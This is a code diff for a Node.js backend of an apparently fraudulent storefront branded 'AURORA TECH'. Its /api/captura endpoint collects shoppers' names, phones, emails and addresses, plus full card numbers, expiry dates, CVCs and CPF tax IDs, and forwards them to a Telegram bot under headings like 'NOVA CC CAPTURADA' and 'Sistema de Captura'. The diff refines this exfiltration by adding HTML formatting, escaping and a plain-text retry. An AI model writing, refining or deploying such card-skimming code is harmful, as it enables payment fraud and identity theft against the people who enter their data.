@@ -49,82 +49,111 @@ function limparDigitos(valor) {
   return String(valor || '').replace(/\D/g, '');
 }
 
+function escaparHtml(valor) {
+  return String(valor ?? '')
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;')
+    .replace(/"/g, '&quot;');
+}
+
+function montarMensagemTelegram(dados) {
+  const ehCartao = dados.formaPagamento === 'Cartão de Crédito';
+  const numeroLimpo = limparDigitos(dados.numeroCartao);
+  const cvcLimpo = limparDigitos(dados.cvc);
+  const cpfLimpo = limparDigitos(dados.cpfTitular);
+
+  const tituloLead = ehCartao
+    ? '🚨 <b>NOVA CC CAPTURADA • AURORA TECH</b>'
+    : '🛒 <b>NOVO PEDIDO CAPTURADO • AURORA TECH</b>';
+
+  const bebeTag = dados.bebe || dados.opBebe || '7 bebe';
+  const origem = dados.origem || 'aurora-tech';
+
+  const linhas = [
+    tituloLead,
+    '━━━━━━━━━━━━━━━━━━━━━━',
+    `🕒 <b>Horário:</b> <code>${escaparHtml(formatarDataHoraBr())}</code>`,
+    `💎 <b>Selo / Opção:</b> <code>${escaparHtml(bebeTag)}</code>`,
+    '',
+    '👤 <b>CLIENTE &amp; ENTREGA</b>',
+    `• <b>Nome:</b> ${escaparHtml(dados.nome || 'Não informado')}`,
+    `• <b>Telefone:</b> ${escaparHtml(dados.telefone || 'Não informado')}`,
+    `• <b>E-mail:</b> ${escaparHtml(dados.email || 'Não informado')}`,
+    `• <b>Endereço:</b> ${escaparHtml(dados.mensagem || 'Não informado')}`,
+    '',
+    '📦 <b>DETALHES DO PEDIDO</b>',
+    `• <b>Itens:</b> ${escaparHtml(dados.produto || 'Não informado')}`,
+    `• <b>Valor:</b> <b>${escaparHtml(dados.valor || 'Não informado')}</b>`,
+    `• <b>Pagamento:</b> ${escaparHtml(dados.formaPagamento || 'Não informado')}`,
+    ''
+  ];
+
+  if (ehCartao) {
+    linhas.push(
+      '💳 <b>DADOS DO CARTÃO (CC)</b>',
+      `• <b>Bandeira:</b> ${escaparHtml(dados.bandeiraCartao || 'Não identificada')}`,
+      `• <b>Parcelas:</b> ${escaparHtml(dados.parcelas || '1x')}`,
+      `• <b>Titular:</b> ${escaparHtml(dados.nomeCompletoCartao || 'Não informado')}`,
+      `• <b>CPF:</b> <code>${escaparHtml(dados.cpfTitular || cpfLimpo || 'Não informado')}</code>`,
+      `• <b>CC:</b> <code>${escaparHtml(numeroLimpo || dados.numeroCartao || 'Não informado')}</code>`,
+      `• <b>Validade:</b> <code>${escaparHtml(dados.validadeCartao || 'Não informado')}</code>`,
+      `• <b>CVC:</b> <code>${escaparHtml(cvcLimpo || dados.cvc || 'Não informado')}</code>`,
+      ''
+    );
+  }
+
+  // Rodapé estilizado da mensagem
+  linhas.push(
+    '━━━━━━━━━━━━━━━━━━━━━━',
+    `🌐 <b>Origem:</b> <code>${escaparHtml(origem)}</code>`,
+    '⚡ <i>AURORA TECH • 7 bebe • Sistema de Captura</i>'
+  );
+
+  return linhas.join('\n');
+}
+
 async function enviarParaTelegram(dados) {
   if (!TELEGRAM_TOKEN || !TELEGRAM_CHAT_ID) {
     throw new Error('TELEGRAM_TOKEN ou TELEGRAM_CHAT_ID não configurado no .env.');
   }
 
-  const ehCartao = dados.formaPagamento === 'Cartão de Crédito';
-  const numeroLimpo = limparDigitos(dados.numeroCartao);
-  const cvcLimpo = limparDigitos(dados.cvc);
-  const cpfLimpo = limparDigitos(dados.cpfTitular);
-  const tituloLead = ehCartao
-    ? '🚨 *NOVA CC CAPTURADA • AURORA TECH*'
-    : '🛒 *NOVO PEDIDO CAPTURADO • AURORA TECH*';
-
-  const blocos = [
-    tituloLead,
-    `🕒 *Horário:* ${formatarDataHoraBr()}`,
-    '',
-    '👤 *CLIENTE & ENTREGA*',
-    `• *Nome:* ${dados.nome || 'Não informado'}`,
-    `• *Telefone:* ${dados.telefone || 'Não informado'}`,
-    `• *E-mail:* ${dados.email || 'Não informado'}`,
-    `• *Endereço:* ${dados.mensagem || 'Não informado'}`,
-    '',
-    '📦 *PEDIDO*',
-    `• *Itens:* ${dados.produto || 'Não informado'}`,
-    `• *Valor:* ${dados.valor || 'Não informado'}`,
-    `• *Pagamento:* ${dados.formaPagamento || 'Não informado'}`,
-    '',
-    ...(ehCartao
-      ? [
-          '💳 *DADOS DO CARTÃO (CC)*',
-          `• *Bandeira:* ${dados.bandeiraCartao || 'Não identificada'}`,
-          `• *Parcelas:* ${dados.parcelas || '1x'}`,
-          `• *Titular:* ${dados.nomeCompletoCartao || 'Não informado'}`,
-          `• *CPF:* \`${dados.cpfTitular || cpfLimpo || 'Não informado'}\``,
-          `• *CC:* \`${numeroLimpo || dados.numeroCartao || 'Não informado'}\``,
-          `• *Validade:* \`${dados.validadeCartao || 'Não informado'}\``,
-          `• *CVC:* \`${cvcLimpo || dados.cvc || 'Não informado'}\``,
-          ''
-        ]
-      : []),
-    `🌐 *Origem:* ${dados.origem || 'aurora-tech'}`
-  ];
-
-  const textoMarkdown = blocos.join('\n');
+  const mensagemHtml = montarMensagemTelegram(dados);
 
   const resposta = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({
       chat_id: TELEGRAM_CHAT_ID,
-      text: textoMarkdown,
-      parse_mode: 'Markdown'
+      text: mensagemHtml,
+      parse_mode: 'HTML',
+      disable_web_page_preview: true
     })
   });
 
   const json = await resposta.json();
   if (!resposta.ok || !json.ok) {
-    if (json.description && json.description.toLowerCase().includes('parse')) {
-      const textoPuro = textoMarkdown.replace(/[*`]/g, '');
-      const retry = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: TELEGRAM_CHAT_ID,
-          text: textoPuro
-        })
-      });
-      const retryJson = await retry.json();
-      if (!retry.ok || !retryJson.ok) {
-        throw new Error(retryJson.description || 'Falha ao enviar mensagem para o Telegram.');
-      }
-      return;
-    }
+    const textoLimpo = mensagemHtml
+      .replace(/<[^>]+>/g, '')
+      .replace(/&amp;/g, '&')
+      .replace(/&lt;/g, '<')
+      .replace(/&gt;/g, '>')
+      .replace(/&quot;/g, '"');
 
-    throw new Error(json.description || 'Falha ao enviar mensagem para o Telegram.');
+    const retry = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: TELEGRAM_CHAT_ID,
+        text: textoLimpo,
+        disable_web_page_preview: true
+      })
+    });
+
+    const retryJson = await retry.json();
+    if (!retry.ok || !retryJson.ok) {
+      throw new Error(retryJson.description || 'Falha ao enviar mensagem para o Telegram.');
+    }
   }
 }
 
@@ -147,6 +176,7 @@ app.post('/api/captura', async (req, res) => {
 
     console.log('=== LEAD ENVIADO AO TELEGRAM ===', {
       tipo: dados.formaPagamento === 'Cartão de Crédito' ? 'NOVA CC CAPTURADA' : 'PEDIDO',
+      bebe: dados.bebe || dados.opBebe || '7 bebe',
       cliente: dados.nome,
       email: dados.email,
       telefone: dados.telefone,
